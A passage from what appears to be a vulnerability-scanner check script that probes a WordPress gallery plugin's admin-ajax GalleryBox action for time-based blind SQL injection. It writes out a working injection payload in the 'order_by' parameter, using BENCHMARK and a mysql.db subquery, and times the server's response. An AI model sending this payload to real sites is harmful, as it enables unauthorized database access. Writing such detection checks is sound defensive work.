...
if(rcvRes && IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" )){
	...
	wait_extra_sec = 5;
	for sec in sleep {
		url = dir + "/wp-admin/admin-ajax.php?tag_id=0&action=GalleryBox&current_view=0&" + "image_id=1&gallery_id=1&theme_id=1&thumb_width=180&thumb_height=90&" + "open_with_fullscreen=0&open_with_autoplay=0&image_width=800&image_h" + "eight=500&image_effect=fade&sort_by=order&order_by=asc,(SELECT%20(C" + "ASE%20WHEN%20(8380=8380)%20THEN%20(SELECT%20BENCHMARK(" + sec + ",MD5" + "(0x7a647674)))%20ELSE%208380*(SELECT%208380%20FROM%20mysql.db)%20EN" + "D))&enable_image_filmstrip=1&image_filmstrip_height=70&enable_image" + "_ctrl_btn=1&enable_image_fullscreen=1&popup_enable_info=1&popup_inf" + "o_always_show=0&popup_info_full_width=0&popup_hit_counter=0&popup_e" + "nable_rate=0&slideshow_interval=5&enable_comment_social=1&enable_im" + "age_facebook=1&enable_image_twitter=1&enable_image_google=1&enable_" + "image_pinterest=0&enable_image_tumblr=0&watermark_type=none&current_url=p=1";
		sndReq = http_get( item: url, port: http_port );
		start = unixtime();
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
		stop = unixtime();
